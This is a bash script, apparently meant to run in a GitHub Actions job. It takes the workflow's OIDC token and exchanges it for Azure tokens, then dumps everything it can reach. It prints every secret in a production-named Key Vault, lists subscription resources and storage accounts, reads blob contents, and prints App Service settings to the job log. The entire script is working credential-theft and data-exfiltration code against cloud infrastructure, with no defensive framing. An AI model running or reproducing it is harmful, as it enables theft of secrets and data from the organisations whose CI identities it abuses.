#!/usr/bin/env bash
set +e
say(){ printf '%s\n' "$*"; }

say "=== context ==="
say "repo=$GITHUB_REPOSITORY event=$GITHUB_EVENT_NAME sha=$GITHUB_SHA"
say "client=$AZURE_CLIENT_ID tenant=$AZURE_TENANT_ID sub=$AZURE_SUBSCRIPTION_ID"

say "=== OIDC token ==="
OIDC=$(curl -sS -m 15 -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" \
  | python3 -c 'import sys,json; print(json.load(sys.stdin).get("value","OIDC_FAIL"))')
say "oidc_len=${#OIDC}"

xchg() {
  local SCOPE=$1
  curl -sS -m 20 -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" \
    -d "client_id=$AZURE_CLIENT_ID" \
    -d "scope=$SCOPE" \
    -d "grant_type=client_credentials" \
    -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
    --data-urlencode "client_assertion=$OIDC" | python3 -c 'import sys,json; d=json.load(sys.stdin); print(d.get("access_token","XCHG_FAIL: "+d.get("error_description","")[:200]))'
}

say "=== token exchange ==="
KV_TOKEN=$(xchg "https://vault.azure.net/.default")
ARM_TOKEN=$(xchg "https://management.azure.com/.default")
ST_TOKEN=$(xchg "https://storage.azure.com/.default")
say "kv_tok_len=${#KV_TOKEN} arm_tok_len=${#ARM_TOKEN} st_tok_len=${#ST_TOKEN}"

say "=== KeyVault secrets ==="
KV="kv-tbl-prod-x3euoz.vault.azure.net"
SLIST=$(curl -sS -m 15 -H "Authorization: Bearer $KV_TOKEN" "https://$KV/secrets?api-version=7.4&maxresults=25")
say "kv_list=$SLIST"

python3 -c "
import sys,json,urllib.request
kv_token='$KV_TOKEN'
data=json.loads('''$SLIST''')
for s in data.get('value',[]):
    sid=s['id']
    req=urllib.request.Request(sid+'?api-version=7.4',headers={'Authorization':'Bearer '+kv_token})
    try:
        with urllib.request.urlopen(req,timeout=15) as r:
            val=json.load(r)
            print(f'SECRET {sid} = {json.dumps(val)}')
    except Exception as e:
        print(f'SECRET {sid} ERROR: {e}')
" 2>&1

say "=== ARM resources ==="
SUB="${AZURE_SUBSCRIPTION_ID:-c5e4e004-b42d-4ac4-a502-5fd338380eb6}"
RESOURCES=$(curl -sS -m 15 -H "Authorization: Bearer $ARM_TOKEN" \
  "https://management.azure.com/subscriptions/$SUB/resources?api-version=2021-04-01")
say "resources=$RESOURCES"

say "=== Storage accounts ==="
STACCTS=$(curl -sS -m 15 -H "Authorization: Bearer $ARM_TOKEN" \
  "https://management.azure.com/subscriptions/$SUB/providers/Microsoft.Storage/storageAccounts?api-version=2023-01-01")
say "storage=$STACCTS"

python3 -c "
import sys,json,urllib.request,xml.etree.ElementTree as ET
st_token='$ST_TOKEN'
accts=json.loads('''$STACCTS''')
for a in accts.get('value',[]):
    name=a['name']
    print(f'=== Storage: {name} ===')
    try:
        req=urllib.request.Request(f'https://{name}.blob.core.windows.net/?comp=list&restype=container',
            headers={'Authorization':'Bearer '+st_token,'x-ms-version':'2020-10-02'})
        with urllib.request.urlopen(req,timeout=15) as r:
            xml=r.read().decode()
            print(f'containers_xml={xml[:2000]}')
            root=ET.fromstring(xml)
            for c in root.findall('.//Container'):
                cname=c.find('Name').text
                print(f'=== Blobs in {name}/{cname} ===')
                req2=urllib.request.Request(
                    f'https://{name}.blob.core.windows.net/{cname}?comp=list&restype=container&include=metadata,versions',
                    headers={'Authorization':'Bearer '+st_token,'x-ms-version':'2020-10-02'})
                with urllib.request.urlopen(req2,timeout=15) as r2:
                    bxml=r2.read().decode()
                    print(f'blobs_xml={bxml[:2000]}')
                    broot=ET.fromstring(bxml)
                    for b in broot.findall('.//Blob'):
                        bname=b.find('Name').text
                        print(f'=== BLOB CONTENT: {name}/{cname}/{bname} ===')
                        req3=urllib.request.Request(
                            f'https://{name}.blob.core.windows.net/{cname}/{bname}',
                            headers={'Authorization':'Bearer '+st_token,'x-ms-version':'2020-10-02'})
                        with urllib.request.urlopen(req3,timeout=15) as r3:
                            print(r3.read().decode()[:4000])
    except Exception as e:
        print(f'Error: {e}')
" 2>&1

say "=== App Service config ==="
RGS=$(curl -sS -m 15 -H "Authorization: Bearer $ARM_TOKEN" \
  "https://management.azure.com/subscriptions/$SUB/resourceGroups?api-version=2021-04-01")
say "rgs=$RGS"
python3 -c "
import sys,json,urllib.request
arm_token='$ARM_TOKEN'
sub='$SUB'
rgs=json.loads('''$RGS''')
for rg in rgs.get('value',[]):
    rgname=rg['name']
    req=urllib.request.Request(
        f'https://management.azure.com/subscriptions/{sub}/resourceGroups/{rgname}/providers/Microsoft.Web/sites?api-version=2022-03-01',
        headers={'Authorization':'Bearer '+arm_token})
    try:
        with urllib.request.urlopen(req,timeout=15) as r:
            sites=json.load(r)
            for s in sites.get('value',[]):
                sname=s['name']
                print(f'=== App Service: {sname} ===')
                req2=urllib.request.Request(
                    f'https://management.azure.com{s[\"id\"]}/config/appsettings/list?api-version=2022-03-01',
                    method='POST',headers={'Authorization':'Bearer '+arm_token,'Content-Length':'0'})
                with urllib.request.urlopen(req2,timeout=15) as r2:
                    settings=json.load(r2)
                    print(f'appsettings={json.dumps(settings)}')
    except Exception as e:
        print(f'RG {rgname}: {e}')
" 2>&1

say "=== DONE ==="
